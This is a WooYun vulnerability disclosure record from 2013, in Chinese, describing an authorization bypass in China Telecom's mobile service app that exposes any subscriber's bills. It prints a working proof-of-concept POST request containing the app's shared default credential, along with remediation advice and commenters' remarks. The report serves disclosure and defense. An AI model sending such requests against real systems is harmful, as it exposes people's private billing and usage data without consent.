{"id": 9546, "wybug_id": "wooyun-2013-033560", "wybug_title": "电信掌上营业厅任意手机号码话费账单查询", "wybug_corp": "电信", "wybug_author": "不走的钟", "wybug_date": "2013-08-05 21:37", "wybug_open_date": "2013-09-19 21:38", "wybug_type": "未授权访问/权限绕过", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "手机安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-08-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-08-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-08-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-09-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-09-19：\t细节向公众公开  简要描述： 电信掌上营业厅APP存在设计错误（本例仅测试平Android平台，IOS应该也相同，但未测试），导致可以任意查询其它手机号码的套餐使用情况、话费信息、历史账单等敏感信息。 详细说明：  从数据包内容推测，厂商为了易用性，让每个手机都使用了相同的默认的密码，根据此密码来进行身份认证，但这样设计存在较高的安全风险，很多用户甚至根本不知道存在默认密码，更不会去修改密码，因此只需要构造简单数据包即可查询任何人的资费信息。仅给一个查询手机号码为18911111111，8月使用的话费额，代码如下：\nPOST /map/clientXML HTTP/1.1Content-Length: 405Content-Type: text/xmlHost: cservice.client.189.cn:8004Connection: Keep-AliveUser-Agent: samsung SCH-N719/3.0.3<Request><HeaderInfos><ClientType>#3.0.3#channel0#samsung SCH-N719#</ClientType><Source>110003</Source><SourcePassword>Sid98s</SourcePassword><Token></Token><UserLoginName>18911111111</UserLoginName><Code>queryBillInfoAll</Code><Timestamp>20130501360211</Timestamp></HeaderInfos><Content><Attach>test</Attach><FieldData><Month>201308</Month><PhoneNum>18911111111</PhoneNum></FieldData></Content></Request>\n   漏洞证明：  漏洞证明：189X手机号码用户，在8月使用了165.4元话费，如下图所示：\n\n   修复方案：      手机用户群体较多，此类问题解决比较麻烦，如果单独设置密码，用户体验会非常差。类似问题网上有讨论使用MAC等手机信息做为绑定，可以提高安全性的同时带来易用性，但我个人觉得不妥当，理由如下：    1、收集手机MAC或其它敏感信息，并远程存放在服务器中，会涉及用户隐私；    2、MAC和其它信息同样可以修改，也不能从根本上解决安全问题。    个人建议仅共参考，可能考虑并不全面，建议如下：    1、用户第一次登录客户端，使用短信认证，登录成功后将seesion存在数据库中，并将有效时间设为超长（例如2－3个月），当用户在会话有效期内正常登录客户端后，继续延长有效时间。如果用户在2-3个月内使用过一次客户端，那么他每次都不需要输入密码。    2、部分用户可能很少使用此功能，可能很长时间才使用一次，例如超过3个月，那么这部分用户，可以使用短信认证，或者其它密码机制；    3、注意本客户端cookie安全性，防止seesion id被轻意泄露。   版权声明：转载请注明来源 不走的钟@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-08-09 22:16 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT向中国电信集团公司通报处置。rank 10 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-08-05 21:50 |    \t\tM0nster \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:17        | 允许我国的艺术家先富起来)\t\t \n  所有地区？    \n     2013-08-06 00:24 |    \t\t不走的钟 \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:2        | 关注网络安全!)\t\t \n  和地区没好像没关系。网上随便找了几个189的号都可以查。    \n     2013-08-08 08:53 |    \t\tOcean \t\t\t( 实习白帽子  |\t\t\t        Rank:78 漏洞数:11        | 你连世界都没有观过，哪来的世界观。)\t\t \n  app应用？还是说掌厅？    \n     2013-09-02 16:15 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  收集手机MAC？换了一个手机的话难道不让查了吗……    \n     2013-09-02 17:07 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  如果用户在2-3个月内使用过一次客户端，那么他每次都不需要输入密码  手机丢了的话就悲剧了    \n     2013-09-21 16:45 |    \t\tsea \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:5        | 好人)\t\t \n  BURP怎么截取手机端的数据呢，能详细的教一下吗？我试过用电脑做WIFI热点，手机连上，然后在手机内设置代理，代理为电脑IP，端口为BURP的设置端口，但无法捕捉到手机的数据。手机无法上网。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}